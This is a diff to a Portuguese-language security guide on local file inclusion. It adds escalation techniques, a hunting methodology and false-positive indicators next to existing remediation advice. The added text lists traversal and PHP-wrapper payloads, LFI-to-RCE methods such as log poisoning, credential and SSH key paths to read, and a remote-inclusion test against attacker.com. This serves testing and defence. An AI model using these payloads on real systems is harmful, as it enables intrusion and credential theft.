@@ -118,6 +118,31 @@ Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (downloads/templates) m
 - **Paths comuns:** `/download`, `/file`, `/view`, `/include`, `/template`, `/locale`, `/lang`, `/export`, `/attachment`, `/image`, `/api/files`, `/render`.
 - **Sinais:** parâmetro com nome de arquivo; erro "No such file"; resposta com conteúdo de arquivo; `Content-Disposition`; upload + visualização.
 
+## Escalation Techniques
+- **LFI to RCE via log poisoning:** injetar payload PHP em log do servidor (User-Agent, Referer) e incluir o arquivo de log via LFI (`/var/log/apache2/access.log`).
+- **LFI to RCE via /proc/self/environ:** se o webserver inclui variaveis de ambiente no processo, injetar codigo via HTTP_USER_AGENT e incluir `/proc/self/environ`.
+- **LFI to RCE via PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php` para ler source code; `php://input` ou `data://text/plain;base64,...` para executar codigo.
+- **Leitura de credenciais:** `/etc/shadow`, `.env`, `config.php`, `wp-config.php`, `application.properties`, `web.config` contem senhas e secrets.
+- **SSH key theft:** `/home/user/.ssh/id_rsa` ou `/root/.ssh/id_rsa` permite login direto no servidor.
+- **Exfiltracao de source code:** ler arquivos da aplicacao para encontrar mais vulnerabilidades (SQLi, hardcoded credentials, hidden endpoints).
+- **Combinar com upload:** fazer upload de arquivo com extensao permitida (`.jpg`) contendo codigo PHP e incluir via LFI.
+
+## Hunting Methodology
+1. Identificar parametros que referenciam arquivos: `file`, `path`, `page`, `template`, `include`, `lang`, `locale`, `view`, `doc`, `download`.
+2. Testar path traversal basico: `../../../etc/passwd`, `....//....//etc/passwd`, `..%2f..%2f..%2fetc/passwd`.
+3. Testar wrappers (PHP): `php://filter/convert.base64-encode/resource=index.php`, `php://input`, `data://`.
+4. Testar null byte (versoes antigas): `../../../etc/passwd%00.php` para truncar extensao.
+5. Testar double encoding: `%252e%252e%252f` para bypass de filtros.
+6. Para blind LFI: se o conteudo nao e refletido, observar diferencas em status code, tempo de resposta ou erros.
+7. Verificar se a aplicacao aceita URLs remotas (RFI): `http://attacker.com/shell.php` -- se aceita, RCE direto.
+
+## False Positive Indicators
+- Aplicacao retorna `404` ou erro generico para paths traversal -- validacao funciona.
+- Parametro aceita nomes de arquivo mas usa allowlist server-side (mapa ID->arquivo) -- nao e LFI.
+- Path traversal e detectado mas o arquivo incluido e vazio ou inacessivel (permissoes de filesystem) -- sem impacto demonstravel.
+- Aplicacao retorna o path como texto na resposta (reflexao) mas nao inclui o arquivo -- nao e LFI.
+- Framework canonicaliza paths automaticamente e rejeita `..` -- protecao implementada.
+
 ## Recommendation
 1. Não usar entrada do usuário diretamente em caminhos. Mapear IDs/chaves para arquivos em allowlist server-side.
 2. Canonicalizar o caminho (`realpath`, `Path.toRealPath`) e verificar se permanece dentro do diretório base.
@@ -134,3 +159,4 @@ if (!requested.startsWith(base)) throw new SecurityException("path traversal");
 if (!Files.isRegularFile(requested)) throw new NotFoundException();
 ```
 9. Monitorar tentativas com `../`, `%2e%2e`, wrappers e acessos a `/etc/passwd`; alertar.
+
